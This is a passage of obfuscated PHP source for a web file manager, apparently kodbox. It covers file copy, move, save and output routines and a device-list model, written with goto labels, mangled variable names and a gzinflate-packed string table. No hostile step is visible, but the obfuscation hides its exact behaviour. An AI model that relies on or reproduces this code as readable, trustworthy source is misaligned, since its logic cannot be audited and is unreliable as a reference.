unset($AÊƒ£óÔÆö[$B¥Œ†é˜ö˜]); continue; } goto f§•¾–Øì’; fÓ¨®ÈàÏ‰: $F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[388]] = $Fù’´ùÉŒß[$F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[366]]]; $F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[2197]] = $Fù’´ùÉŒß[$F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[2184]]]; if ($F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[29]] == $bŠÑÈÜˆĞ[484]) { $F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[401]][$bŠÑÈÜˆĞ[979]] = $Fù’´ùÉŒß[$F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[401]][$bŠÑÈÜˆĞ[979]]]; $F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[401]][$bŠÑÈÜˆĞ[980]] = $Fù’´ùÉŒß[$F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[401]][$bŠÑÈÜˆĞ[980]]]; } goto CÃŒÊáÜÕÊ; b³íÎ½Ü‹: } $aõÂÆĞ´’É[$bŠÑÈÜˆĞ[401]] = $F¬Ÿ Íå¨Ş; goto a·µ¹ ÇÔ; a·µ¹ ÇÔ: unset($aõÂÆĞ´’É[$bŠÑÈÜˆĞ[2357]]); $F¥ ê¾Û¡Ó[] = $aõÂÆĞ´’É; goto BŞ®Ò¸Şì©; b±ºÌ“¬­Ú: $aõÂÆĞ´’É[$bŠÑÈÜˆĞ[28]] = isset($bÖ½¡ë¦—[$bŠÑÈÜˆĞ[28]]) ? $bÖ½¡ë¦—[$bŠÑÈÜˆĞ[28]] : LNG($bŠÑÈÜˆĞ[2352]); $aõÂÆĞ´’É[$bŠÑÈÜˆĞ[2232]] = isset($bÖ½¡ë¦—[$bŠÑÈÜˆĞ[2232]]) ? $bÖ½¡ë¦—[$bŠÑÈÜˆĞ[2232]] : $bŠÑÈÜˆĞ[33]; $aõÂÆĞ´’É[$bŠÑÈÜˆĞ[1248]] = isset($Cã‘Éë±ê™[$F¹É»å¿Â ]) ? $Cã‘Éë±ê™[$F¹É»å¿Â ] : $F“¤ªğ‰­; goto cƒàËÖí§Ì; cƒàËÖí§Ì: $aõÂÆĞ´’É[$bŠÑÈÜˆĞ[2149]] = $bÖ½¡ë¦—; $F¬Ÿ Íå¨Ş = json_decode($aõÂÆĞ´’É[$bŠÑÈÜˆĞ[401]], !0); $aõÂÆĞ´’É[$bŠÑÈÜˆĞ[2349]] = isset($F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[2349]]) ? $F¬Ÿ Íå¨Ş[$bŠÑÈÜˆĞ[2349]] : $bŠÑÈÜˆĞ[33]; goto D¥Î‡â¹É; BŞ®Ò¸Şì©: } $this->clearSystemPathLog($Fà¡ÌÔ‰); goto dÌ’äÚ˜; EÜÑ¡šß‰Ú: $bŠÑÈÜˆĞ =& $_SERVER[ì‹É]; $bÁ›£¯¥Ûç = array_to_keyvalue($AÊƒ£óÔÆö, $bŠÑÈÜˆĞ[33], $bŠÑÈÜˆĞ[1351]); $CáŸæÏŸ‡á = Model($bŠÑÈÜˆĞ[469])->userListInfo(array_unique($bÁ›£¯¥Ûç)); goto aƒÀ¯ŸÏ† ; eº¶¯øÜÆã: } private function clearSystemPathLog($fÄÌèÙß’Õ) { $dÌ™‹Ù¥ò =& $_SERVER[ì‹É]; if (count($fÄÌèÙß’Õ) == 0) { return; } $dåÈ©¥ùò = array($dÌ™‹Ù¥ò[364] => array($dÌ™‹Ù¥ò[7], array_unique($fÄÌèÙß’Õ))); $this->where($dåÈ©¥ùò)->delete(); } public function deviceList($dõ‹Æ³”Ûò, $FØ«Š¹âƒ¾ = 0) { $fÏ­ Ÿà‘ê =& $_SERVER[ì‹É]; $a‹‘£ñ£ = array($fÏ­ Ÿà‘ê[1351] => $dõ‹Æ³”Ûò, $fÏ­ Ÿà‘ê[184] => array($fÏ­ Ÿà‘ê[925], $FØ«Š¹âƒ¾), $fÏ­ Ÿà‘ê[29] => $fÏ­ Ÿà‘ê[1955]); $Eî¬ìæ¦öº = array(); $a¹ÛØÒ¿ÏÈ = $this->field($fÏ­ Ÿà‘ê[2358])->where($a‹‘£ñ£)->order($fÏ­ Ÿà‘ê[2195])->select(); foreach ($a¹ÛØÒ¿ÏÈ as $cÕ‚ó¶´½‘ => $dÜï…‹·ï¦) { goto d²ÊÁ‡¤; B—»¬‡ÑÔ: $this->ipAddress($dÜï…‹·ï¦); $dÜï…‹·ï¦[$fÏ­ Ÿà‘ê[401]] = $BŠäªÓåÓè; $Eî¬ìæ¦öº[$FÀ‚åÖ³Á] = $dÜï…‹·ï¦; goto bæÄÃ†Ğƒ‘; fˆå‚àš™È: unset($BŠäªÓåÓè[$fÏ­ Ÿà‘ê[2349]]); $FÀ‚åÖ³Á = $this->deviceType($BŠäªÓåÓè[$fÏ­ Ÿà‘ê[2186]]); if (isset($Eî¬ìæ¦öº[$FÀ‚åÖ³Á])) { continue; } goto B—»¬‡ÑÔ; d²ÊÁ‡¤: if ($cÕ‚ó¶´½‘ > 0 && abs($dÜï…‹·ï¦[$fÏ­ Ÿà‘ê[184]] - $a¹ÛØÒ¿ÏÈ[$cÕ‚ó¶´½‘ - 1][$fÏ­ Ÿà‘ê[184]]) < 5) { continue; } $BŠäªÓåÓè = json_decode($dÜï…‹·ï¦[$fÏ­ Ÿà‘ê[401]], !0); $dÜï…‹·ï¦[$fÏ­ Ÿà‘ê[2349]] = isset($BŠäªÓåÓè[$fÏ­ Ÿà‘ê[2349]]) ? $BŠäªÓåÓè[$fÏ­ Ÿà‘ê[2349]] : $fÏ­ Ÿà‘ê[33]; goto fˆå‚àš™È; bæÄÃ†Ğƒ‘: } return array_values($Eî¬ìæ¦öº); } public function deviceType($añ‹ùÒ†–œ) { return $añ‹ùÒ†–œ; } } goto Eá›ß˜Õ‘…; Cí™×Øë: $D”µÓí­©Å = $_SERVER[ì‹É][539]; if (!$D”µÓí­©Å) { return; } $_SERVER[ºÀ] = explode($_SERVER[ì‹É][540], gzinflate(substr($_SERVER[ì‹É][541], 10, -8))); goto E¶ôÀ¹µ÷ã; c×î½Ë½µ·: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($dêË´ÎíÚğ, $b¡œ±à†·¨) { $fœ¢É¶ëŒ‘ = self::driverMake($b¡œ±à†·¨[0]); if (method_exists($fœ¢É¶ëŒ‘, $dêË´ÎíÚğ)) { return @call_user_func_array(array($fœ¢É¶ëŒ‘, $dêË´ÎíÚğ), $b¡œ±à†·¨); } if (method_exists($fœ¢É¶ëŒ‘, $_SERVER[ì‹É][970])) { return @call_user_func_array(array($fœ¢É¶ëŒ‘, $dêË´ÎíÚğ), $b¡œ±à†·¨); } else { if (method_exists(self, $dêË´ÎíÚğ)) { return @call_user_func_array(array(self, $dêË´ÎíÚğ), $b¡œ±à†·¨); } else { call_user_func_array(array(parent, $dêË´ÎíÚğ), $b¡œ±à†·¨); } } } public static function init($e°ñññèò‚) { return self::driverMake($e°ñññèò‚); } public static function copy($aÖöà‡½ï½, $c­îªÂÖƒ, $dù¿º„‡» = false, $Aø½«æĞ = false) { return self::copyMove($aÖöà‡½ï½, $c­îªÂÖƒ, $dù¿º„‡», $_SERVER[ì‹É][482], $Aø½«æĞ); } public static function move($AŠ™Ü¤¦Ò, $B‹ã‚¹¢æÀ, $A‚Š˜¾ÄÊõ = false, $BÊ®ìÊ—‡Ö = false) { return self::copyMove($AŠ™Ü¤¦Ò, $B‹ã‚¹¢æÀ, $A‚Š˜¾ÄÊõ, $_SERVER[ì‹É][484], $BÊ®ìÊ—‡Ö); } public static function saveFile($bÃîìŠ¾ô», $b¬Â§ùÑŸ, $d ´çøİéÀ = true) { goto CÔ¶ñ‡†Ù; AÂèé¡Ã µ: $A¦Ó’°¶ÂŸ = $CÂœ›¿óÕ->pathFather($b¬Â§ùÑŸ); $AŠ‘ÏÜ›¶¢ = !0; if (!$d ´çøİéÀ && self::driverIsSame($Fˆæ…„Åğ, $CÂœ›¿óÕ)) { $AŠ‘ÏÜ›¶¢ = !1; } goto b‰ì¶›íÁ“; C•Ï«ªÅºå: $CÂœ›¿óÕ = self::driverMake($b¬Â§ùÑŸ); $A¡²†¨á©’ = !1; if ($CÂœ›¿óÕ->pathParse[$DÇ·‰Ì§ëÇ[971]]) { $FÊ¸ßÕ´—È = $CÂœ›¿óÕ->pathParse[$DÇ·‰Ì§ëÇ[971]]; $A¡²†¨á©’ = $CÂœ›¿óÕ; $CÂœ›¿óÕ = self::driverMake($FÊ¸ßÕ´—È); } goto AÂèé¡Ã µ; b‰ì¶›íÁ“: $B¥˜©í¤ãš = self::copyFile($Fˆæ…„Åğ, $bÃîìŠ¾ô», $CÂœ›¿óÕ, $A¦Ó’°¶ÂŸ, $bÙ”æÚåñ¡[$DÇ·‰Ì§ëÇ[28]], $AŠ‘ÏÜ›¶¢); if ($A¡²†¨á©’) { $B¥˜©í¤ãš = $A¡²†¨á©’->getPathOuter($B¥˜©í¤ãš); } return $B¥˜©í¤ãš; goto e§ÉÍ·ÓÔ¯; CÔ¶ñ‡†Ù: $DÇ·‰Ì§ëÇ =& $_SERVER[ì‹É]; $bÙ”æÚåñ¡ = self::info($b¬Â§ùÑŸ); $Fˆæ…„Åğ = self::driverMake($bÃîìŠ¾ô»); goto C•Ï«ªÅºå; e§ÉÍ·ÓÔ¯: } private static function copyMove($FîÈÇ­ìîº, $E…´ƒéçÉ¿, $c¸ì¹ëÒÂ, $EÚÀ§†¸Á, $AËˆï¶Ü–‹ = false) { goto Cññ×óöô; AŒ“ª›èõÃ: $fğß–÷‘Ø = self::driverMake($FîÈÇ­ìîº); $FßíŞø¦³ = self::driverMake($E…´ƒéçÉ¿); $aî‚ëÂ¿¼Ù = $EÚÀ§†¸Á == $dÅ„©À‰çä[484]; goto CÏ‡ÚÅ‡‹; Cññ×óöô: $dÅ„©À‰çä =& $_SERVER[ì‹É]; if (!$FîÈÇ­ìîº || $FîÈÇ­ìîº == $dÅ„©À‰çä[8] || !$E…´ƒéçÉ¿) { return !1; } ignore_timeout(); goto AŒ“ª›èõÃ; fÌ·àâñÆ÷: if ($EÕíñ×¢§¥) { $E–Ô‚íŞô = $EÕíñ×¢§¥->getPathOuter($E–Ô‚íŞô); } return $E–Ô‚íŞô; goto F„Ùä²Š«Ö; CÏ‡ÚÅ‡‹: $EÕíñ×¢§¥ = !1; if ($FßíŞø¦³->pathParse[$dÅ„©À‰çä[971]]) { $E…´ƒéçÉ¿ = $FßíŞø¦³->pathParse[$dÅ„©À‰çä[971]]; $EÕíñ×¢§¥ = $FßíŞø¦³; $FßíŞø¦³ = self::driverMake($E…´ƒéçÉ¿); } self::check($fğß–÷‘Ø, $FîÈÇ­ìîº, $FßíŞø¦³, $E…´ƒéçÉ¿); goto dî„°è†¯; dî„°è†¯: Hook::trigger($dÅ„©À‰çä[73], $fğß–÷‘Ø, $FîÈÇ­ìîº, $FßíŞø¦³, $E…´ƒéçÉ¿); $DÔ…ìœåŞ = self::driverIsSame($fğß–÷‘Ø, $FßíŞø¦³); if ($DÔ…ìœåŞ) { if ($EÚÀ§†¸Á == $dÅ„©À‰çä[484] && trim($E…´ƒéçÉ¿, $dÅ„©À‰çä[8]) == trim($FßíŞø¦³->pathFather($FîÈÇ­ìîº), $dÅ„©À‰çä[8])) { return $FßíŞø¦³->getPathOuter($FîÈÇ­ìîº); } if (method_exists($FßíŞø¦³, $EÚÀ§†¸Á)) { return $FßíŞø¦³->{$EÚÀ§†¸Á}($FîÈÇ­ìîº, $E…´ƒéçÉ¿, $c¸ì¹ëÒÂ); } } goto a—ÉÀÓšâ; a—ÉÀÓšâ: $BÃö†²òö˜ = $fğß–÷‘Ø->isFile($FîÈÇ­ìîº); if (!$BÃö†²òö˜ && $FßíŞø¦³->getType() == $dÅ„©À‰çä[681] && $fğß–÷‘Ø->getType() == $dÅ„©À‰çä[104]) { $E–Ô‚íŞô = $FßíŞø¦³->copyFolderFromIO($fğß–÷‘Ø, $FîÈÇ­ìîº, $E…´ƒéçÉ¿, $c¸ì¹ëÒÂ, $aî‚ëÂ¿¼Ù, $AËˆï¶Ü–‹); } else { $E–Ô‚íŞô = self::copyPath($fğß–÷‘Ø, $FîÈÇ­ìîº, $FßíŞø¦³, $E…´ƒéçÉ¿, $c¸ì¹ëÒÂ, $aî‚ëÂ¿¼Ù, $BÃö†²òö˜, $AËˆï¶Ü–‹); } if ($E–Ô‚íŞô && $aî‚ëÂ¿¼Ù) { $fğß–÷‘Ø->remove($FîÈÇ­ìîº); } goto fÌ·àâñÆ÷; F„Ùä²Š«Ö: } private static function check($EŸ‘£ª„öá, $cáŸÃª·‹©, $AìííÂÎùÑ, &$FˆÙØ îÕÆ) { $C“Ô‡‹Ã¢ì =& $_SERVER[ì‹É]; if (self::driverIsSame($EŸ‘£ª„öá, $AìííÂÎùÑ) && $EŸ‘£ª„öá->isFolder($cáŸÃª·‹©) && $EŸ‘£ª„öá->isParentOf($cáŸÃª·‹©, $FˆÙØ îÕÆ)) { show_json(LNG($C“Ô‡‹Ã¢ì[972]), !1); } if (!$EŸ‘£ª„öá->exist($cáŸÃª·‹©)) { show_json(LNG($C“Ô‡‹Ã¢ì[103]), !1); } } private static function copyPath($DÓÑœ¼ÇÀÉ, $dšõÇƒ’‚‰, $Bàƒ¢…’ã·, $ağ» ‡öïï, $AÑô¯ƒ“‚—, $EÎ‡á—À©, $BÊİ÷ÜÂŠÊ, $BÄ»æŠ´— = false) { goto F¥èÍ ³‹ç; FÑ‘ÂÂãÍ: if ($BÊİ÷ÜÂŠÊ) { return self::copyFile($DÓÑœ¼ÇÀÉ, $dšõÇƒ’‚‰, $Bàƒ¢…’ã·, $ağ» ‡öïï, $C©í³Ì‘‰Ù, $EÎ‡á—À©); } if ($AÑô¯ƒ“‚— == REPEAT_RENAME_FOLDER) { $AÑô¯ƒ“‚— = !1; } $FØ¹ùïíŠ = rtrim($ağ» ‡öïï, $e¯¶¤Ç–ï[8]) . $e¯¶¤Ç–ï[8] . $C©í³Ì‘‰Ù; goto Eéõİ¾ìÛ£; F¥èÍ ³‹ç: $e¯¶¤Ç–ï =& $_SERVER[ì‹É]; $C©í³Ì‘‰Ù = $BÄ»æŠ´— ? $BÄ»æŠ´— : $DÓÑœ¼ÇÀÉ->getPathName($DÓÑœ¼ÇÀÉ->pathThis($dšõÇƒ’‚‰)); if ($AÑô¯ƒ“‚—) { $F„Èò‰„ê = $Bàƒ¢…’ã·->fileNameExist($ağ» ‡öïï, $C©í³Ì‘‰Ù); $C©í³Ì‘‰Ù = $Bàƒ¢…’ã·->fileNameAuto($ağ» ‡öïï, $C©í³Ì‘‰Ù, $AÑô¯ƒ“‚—, !$BÊİ÷ÜÂŠÊ); $AÑô¯ƒ“‚— = $F„Èò‰„ê ? $AÑô¯ƒ“‚— : !1; } goto FÑ‘ÂÂãÍ; AÉÁ¨‘¸ò›: $E¹‰ø‰³‘ = array_merge($AÑ†ƒ¿ÉİØ[$e¯¶¤Ç–ï[74]], $AÑ†ƒ¿ÉİØ[$e¯¶¤Ç–ï[75]]); foreach ($E¹‰ø‰³‘ as $f½‡‰êÜóÄ) { $a›î§²Ëã‘ = $f½‡‰êÜóÄ[$e¯¶¤Ç–ï[29]] == $e¯¶¤Ç–ï[164]; $dšõÇƒ’‚‰ = $DÓÑœ¼ÇÀÉ->getPathInner($f½‡‰êÜóÄ[$e¯¶¤Ç–ï[76]]); $AÛ’‚¾Š×Ã = self::copyPath($DÓÑœ¼ÇÀÉ, $dšõÇƒ’‚‰, $Bàƒ¢…’ã·, $ağ» ‡öïï, $AÑô¯ƒ“‚—, $EÎ‡á—À©, $a›î§²Ëã‘); if (!$AÛ’‚¾Š×Ã) { write_log($e¯¶¤Ç–ï[973] . $dšõÇƒ’‚‰ . $e¯¶¤Ç–ï[974] . $ağ» ‡öïï, $e¯¶¤Ç–ï[975]); } } return $A·†øÀÉ¦á; goto F¨÷•ï¹¾¬; Eéõİ¾ìÛ£: $A·†øÀÉ¦á = $Bàƒ¢…’ã·->mkdir($Bàƒ¢…’ã·->getPath($FØ¹ùïíŠ)); $ağ» ‡öïï = $Bàƒ¢…’ã·->getPathInner($A·†øÀÉ¦á); $AÑ†ƒ¿ÉİØ = $DÓÑœ¼ÇÀÉ->listPath($dšõÇƒ’‚‰, !0); goto AÉÁ¨‘¸ò›; F¨÷•ï¹¾¬: } private static function copyFile($FêÏˆ†šÉ», $DõÃ¬ğ¹Óê, $eëí×’ŸÍê, $dœ–í˜¡”’, $d“‡ç›Ç‰›, $AÙ‘—ô¹àù) { goto B¡á­Àº; B¡á­Àº: $E´ÆÙé©ö =& $_SERVER[ì‹É]; $dœ–í˜¡”’ = $eëí×’ŸÍê->getPath(rtrim($dœ–í˜¡”’, $E´ÆÙé©ö[8]) . $E´ÆÙé©ö[8] . $d“‡ç›Ç‰›); $EÛ Ì¸”ŠÄ = $E´ÆÙé©ö[976] . time() . rand_string(5); goto BÂŸÑŒÈİ¼; bª„Ú»–Š: mk_dir($Fˆæ‡¦•À‘); $e‰ãôË ôæ = $Fˆæ‡¦•À‘ . $EÛ Ì¸”ŠÄ; $e‰ãôË ôæ = $FêÏˆ†šÉ»->download($DõÃ¬ğ¹Óê, $e‰ãôË ôæ); goto Eƒ˜¨ïŠÉ; Eƒ˜¨ïŠÉ: $e‰ãôË ôæ = $FêÏˆ†šÉ»->iconvApp($e‰ãôË ôæ); $AˆÔŒ¸Å’İ = $eëí×’ŸÍê->upload($dœ–í˜¡”’, $e‰ãôË ôæ, $AÙ‘—ô¹àù); self::remove($Fˆæ‡¦•À‘ . $EÛ Ì¸”ŠÄ); goto cÂ²ô×à ; BÂŸÑŒÈİ¼: Hook::trigger($E´ÆÙé©ö[977], $FêÏˆ†šÉ», $DõÃ¬ğ¹Óê, $eëí×’ŸÍê, $dœ–í˜¡”’, $d“‡ç›Ç‰›, $EÛ Ì¸”ŠÄ); if (self::driverIsSame($FêÏˆ†šÉ», $eëí×’ŸÍê)) { if ($AÙ‘—ô¹àù) { $AˆÔŒ¸Å’İ = $eëí×’ŸÍê->moveFile($DõÃ¬ğ¹Óê, $dœ–í˜¡”’); } else { $AˆÔŒ¸Å’İ = $eëí×’ŸÍê->copyFile($DõÃ¬ğ¹Óê, $dœ–í˜¡”’); } Hook::trigger($E´ÆÙé©ö[978], $FêÏˆ†šÉ», $DõÃ¬ğ¹Óê, $eëí×’ŸÍê, $dœ–í˜¡”’, $d“‡ç›Ç‰›, $AˆÔŒ¸Å’İ); return $AˆÔŒ¸Å’İ; } $Fˆæ‡¦•À‘ = TEMP_FILES; goto bª„Ú»–Š; cÂ²ô×à : Hook::trigger($E´ÆÙé©ö[978], $FêÏˆ†šÉ», $DõÃ¬ğ¹Óê, $eëí×’ŸÍê, $dœ–í˜¡”’, $d“‡ç›Ç‰›, $AˆÔŒ¸Å’İ); return $AˆÔŒ¸Å’İ; goto Bà‹ñÎËÏ©; Bà‹ñÎËÏ©: } public static function pathFather($Eóª­¿²ò«) { $d…õí…‡ = IO::init($Eóª­¿²ò«); $FîÈÖœŒøß = $d…õí…‡->pathFather($d…õí…‡->path); return $d…õí…‡->getPathOuter($FîÈÖœŒøß); } public static function fileOut($eŠ¥ÅÀƒè˜, $bé›ŠÀ¿õÑ = false, $d†ôØ„ôÊÃ = false, $D„áÃóÆ¤† = '') { $F„›™Î¤¹ = self::driverMake($eŠ¥ÅÀƒè˜); if ($F„›™Î¤¹->isFileOutServer()) { return $F„›™Î¤¹->fileOutServer($eŠ¥ÅÀƒè˜, $bé›ŠÀ¿õÑ, $d†ôØ„ôÊÃ, $D„áÃóÆ¤†); } return $F„›™Î¤¹->fileOut($eŠ¥ÅÀƒè˜, $bé›ŠÀ¿õÑ, $d†ôØ„ôÊÃ, $D„áÃóÆ¤†); } public static function fileOutImage($cÒ›İè­¡, $cÛªßÓÀòå = 250) { $aË°‹ˆ·º = array(250, 600, 1200, 3000); for ($BŞ¢‹ÃÛÛ = 0; $BŞ¢‹ÃÛÛ < count($aË°‹ˆ·º); $BŞ¢‹ÃÛÛ++) { if ($BŞ¢‹ÃÛÛ == 0 && $cÛªßÓÀòå <= $aË°‹ˆ·º[$BŞ¢‹ÃÛÛ]) { $cÛªßÓÀòå = $aË°‹ˆ·º[$BŞ¢‹ÃÛÛ]; break; } else { if ($cÛªßÓÀòå > $aË°‹ˆ·º[$BŞ¢‹ÃÛÛ - 1] && $cÛªßÓÀòå <= $aË°‹ˆ·º[$BŞ¢‹ÃÛÛ]) { $cÛªßÓÀòå = $aË°‹ˆ·º[$BŞ¢‹ÃÛÛ]; break; } else { if ($BŞ¢‹ÃÛÛ == count($aË°‹ˆ·º) - 1 && $cÛªßÓÀòå > $aË°‹ˆ·º[$BŞ¢‹ÃÛÛ]) { $cÛªßÓÀòå = $aË°‹ˆ·º[$BŞ¢‹ÃÛÛ]; break; } } } } $D™ÄÄ¾í× = self::driverMake($cÒ›İè­¡); if ($D™ÄÄ¾í×->isFileOutServer()) { return $D™ÄÄ¾í×->fileOutImageServer($cÒ›İè­¡, $cÛªßÓÀòå); } return $D™ÄÄ¾í×->fileOutImage($cÒ›İè­¡, $cÛªßÓÀòå); } private static function driverIsSame($fæµÙŸ¥ŞŸ, $AæÒÂ–°Ò) { goto DÍÌä£ª×Ô; DÍÌä£ª×Ô: $dˆÉ’Éô¢Ç =& $_SERVER[ì‹É]; $c»ÆÃĞÀÌ = $fæµÙŸ¥ŞŸ->getType(); $DêÏË–­ù = $AæÒÂ–°Ò->getType(); goto D¢£ØìïÓš; D¢£ØìïÓš: if ($c»ÆÃĞÀÌ != $DêÏË–­ù) { return !1; } if ($c»ÆÃĞÀÌ == $dˆÉ’Éô¢Ç[681]) { return !0; } if ($c»ÆÃĞÀÌ == $dˆÉ’Éô¢Ç[104]) { return !0; } goto d¥ÉàªŞ¼; d¥ÉàªŞ¼: if ($fæµÙŸ¥ŞŸ->pathDriver == $AæÒÂ–°Ò->pathDriver) { return !0; } return !1; goto e¡Ê˜ŞŸõœ; e¡Ê˜ŞŸõœ: } public static function copyUpdate($dÓù±ğ™–Í, $d±ëĞÎ’á”) { goto F³³àÀ›‰×; B¼¶Îäç¹›: $D­÷İÔ‡ƒß = array(); foreach ($f»š¼ßÅÎ as $d…êœøêÖŒ => $Dä¿å½´ğ) { if ($Dä¿å½´ğ[$añŒùÑ‚‡Æ[77]] == 1 && !isset($EóÎ“´æëí[$d…êœøêÖŒ])) { $D­÷İÔ‡ƒß[] = $d±ëĞÎ’á” . $añŒùÑ‚‡Æ[8] . $d…êœøêÖŒ; } if ($Dä¿å½´ğ[$añŒùÑ‚‡Æ[77]] == 0) { if (!isset($EóÎ“´æëí[$d…êœøêÖŒ]) || $EóÎ“´æëí[$d…êœøêÖŒ][$añŒùÑ‚‡Æ[78]] != $Dä¿å½´ğ[$añŒùÑ‚‡Æ[78]]) { $b¢ÛÆ³ÀÙ [] = array($añŒùÑ‚‡Æ[979] => $Dä¿å½´ğ[$añŒùÑ‚‡Æ[76]], $añŒùÑ‚‡Æ[980] => $d±ëĞÎ’á” . $añŒùÑ‚‡Æ[8] . get_path_father($d…êœøêÖŒ), $añŒùÑ‚‡Æ[981] => $Dä¿å½´ğ); if (isset($EóÎ“´æëí[$d…êœøêÖŒ])) { IO::remove($d±ëĞÎ’á” . $añŒùÑ‚‡Æ[8] . $d…êœøêÖŒ); } } } } $FÑë¾„¥Œó = array($añŒùÑ‚‡Æ[164] => $b¢ÛÆ³ÀÙ , $añŒùÑ‚‡Æ[77] => $D­÷İÔ‡ƒß); goto cê¥«œçØ¾; cê¥«œçØ¾: Hook::trigger($añŒùÑ‚‡Æ[982], $dÓù±ğ™–Í, $d±ëĞÎ’á”, $FÑë¾„¥Œó); foreach ($D­÷İÔ‡ƒß as $Dä¿å½´ğ) { IO::mkdir($Dä¿å½´ğ); } foreach ($b¢ÛÆ³ÀÙ  as $Dä¿å½´ğ) { IO::copy($Dä¿å½´ğ[$añŒùÑ‚‡Æ[979]], $Dä¿å½´ğ[$añŒùÑ‚‡Æ[980]], REPEAT_REPLACE); } goto a®ì«óÍï; F³³àÀ›‰×: $añŒùÑ‚‡Æ =& $_SERVER[ì‹É]; if (!IO::exist($dÓù±ğ™–Í)) { return !1; } if (!IO::exist($d±ëĞÎ’á”)) { IO::mkdir($d±ëĞÎ’á”); } goto E÷¶ôÆ½‡¦; E÷¶ôÆ½‡¦: $f»š¼ßÅÎ = self::_listAll($dÓù±ğ™–Í); $EóÎ“´æëí = self::_listAll($d±ëĞÎ’á”); $b¢ÛÆ³ÀÙ  = array(); goto B¼¶Îäç¹›; a®ì«óÍï: } private static function _listAll($dÒÀ¤ßŞè„) { $dŒŞƒ•ŞÖ =& $_SERVER[ì‹É]; $dÒÀ¤ßŞè„ = KodIO::clear($dÒÀ¤ßŞè„); $BÒ²äŞ†Îš = IO::listAll($dÒÀ¤ßŞè„); foreach ($BÒ²äŞ†Îš as &$Eğè¨¸ÁÖ) { $f§èÛ±•§ = substr($Eğè¨¸ÁÖ[$dŒŞƒ•ŞÖ[76]], strlen($dÒÀ¤ßŞè„)); $Eğè¨¸ÁÖ[$dŒŞƒ•ŞÖ[983]] = trim($f§èÛ±•§, $dŒŞƒ•ŞÖ[8]); } return array_to_keyvalue($BÒ²äŞ†Îš, $dŒŞƒ•ŞÖ[983]); } public static function fileSubstr($aá­ŞîãÎ, $DÙÄãÙó, $Aì–å¨Û½— = false) { goto cğÜ¬‘¬µ¶; fĞøØµ³ÒÉ: $e„¦¯ŸÀ‡´ = $Aì–å¨Û½—; if ($DÙÄãÙó < 0) { $DÙÄãÙó = $DÕÒ’•‘‰¤ + $DÙÄãÙó; } if ($Aì–å¨Û½— === !1) { $Aì–å¨Û½— = $DÕÒ’•‘‰¤ - $DÙÄãÙó; } goto D¿°´½‡‚; D¿°´½‡‚: if ($DÙÄãÙó + $Aì–å¨Û½— > $DÕÒ’•‘‰¤) { $Aì–å¨Û½— = $DÕÒ’•‘‰¤ - $DÙÄãÙó; } if ($Aì–å¨Û½— <= 0) { return $_SERVER[ì‹É][33]; } if ($DÙÄãÙó < 0 || $DÙÄãÙó >= $DÕÒ’•‘‰¤ || $Aì–å¨Û½— > 1024 * 1024 * 5) { throw new Exception("\146\x69\x6c\145\122\x65\141\144\x20\145\x72\162\x6f\x72\x21\x20\x73\164\141\x72\x74\x3d{$DÙÄãÙó}\73\x6c\145\156\147\x74\150\75{$Aì–å¨Û½—}\x3b\40\x73\151\x7a\145\75{$DÕÒ’•‘‰¤}\73"); } goto eÜ‰ä½¿‡; eÜ‰ä½¿‡: return $D­íßŒ ½->fileSubstr($aá­ŞîãÎ, $DÙÄãÙó, $Aì–å¨Û½—); goto B¿¿œßƒ†; cğÜ¬‘¬µ¶: $D­íßŒ ½ = self::driverMake($aá­ŞîãÎ); $DÕÒ’•‘‰¤ = $D­íßŒ ½->size($aá­ŞîãÎ); $C¡ĞÁ¯Æ‚ = $DÙÄãÙó; goto fĞøØµ³ÒÉ; B¿¿œßƒ†: } private static function driverMake(&$A½÷¼Ş†®È) { goto a…¸ìà¯õ; a…¸ìà¯õ: $Fˆ›‰îÄ Ô =& $_SERVER[ì‹É]; $Bóî¡àµƒ = KodIO::parse($A½÷¼Ş†®È); if (!self::$driverListSystem) { $AíëŸÜí° = Model($Fˆ›‰îÄ Ô[691])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($AíëŸÜí°, $Fˆ›‰îÄ Ô[364]); } goto Bñè„á¹š„; Bñè„á¹š„: if ($Bóî¡àµƒ[$Fˆ›‰îÄ Ô[29]] == KodIO::KOD_IO && !self::$driverListSystem[$Bóî¡àµƒ[$Fˆ›‰îÄ Ô[364]]]) { return !1; } $A½÷¼Ş†®È = $Bóî¡àµƒ[$Fˆ›‰îÄ Ô[984]]; $d»ÜÒç‚µ = self::driverGet($Bóî¡àµƒ, $A½÷¼Ş†®È); goto F¥¦‘‡Üô¦; F¥¦‘‡Üô¦: return $d»ÜÒç‚µ; goto Eƒß‚œÎ¬; Eƒß‚œÎ¬: } private static function driverGet($b¼Îß¯„, &$Aæ¨ğã¢‘Ø) { goto bàŸ‹è¼ß; cå˜ÁÕ“ïô: if (isset($aš¸—¡§Œ®[$BÒ„ˆö×¬¶[6]][$BÒ„ˆö×¬¶[996]])) { $CÆÂ íóæ°->pathBase = rtrim($aš¸—¡§Œ®[$BÒ„ˆö×¬¶[6]][$BÒ„ˆö×¬¶[996]], $BÒ„ˆö×¬¶[8]) . $BÒ„ˆö×¬¶[8]; $Aæ¨ğã¢‘Ø = $CÆÂ íóæ°->pathBase . ltrim($Aæ¨ğã¢‘Ø, $BÒ„ˆö×¬¶[8]); } $Aæ¨ğã¢‘Ø = $CÆÂ íóæ°->getPath($Aæ¨ğã¢‘Ø); if (isset($b¼Îß¯„[$BÒ„ˆö×¬¶[971]])) { $Aæ¨ğã¢‘Ø = $b¼Îß¯„[$BÒ„ˆö×¬¶[971]]; } goto E˜Å½ÖÏëÓ; FƒÈ´İ÷µä: switch ($b¼Îß¯„[$BÒ„ˆö×¬¶[29]]) { case KodIO::KOD_IO: $aš¸—¡§Œ® = self::$driverListSystem[$FÁ»ËõÂã‹]; break; case KodIO::KOD_SOURCE: $Aæ¨ğã¢‘Ø = $FÁ»ËõÂã‹ . $Aæ¨ğã¢‘Ø; $aš¸—¡§Œ® = array($BÒ„ˆö×¬¶[986] => $BÒ„ˆö×¬¶[987], 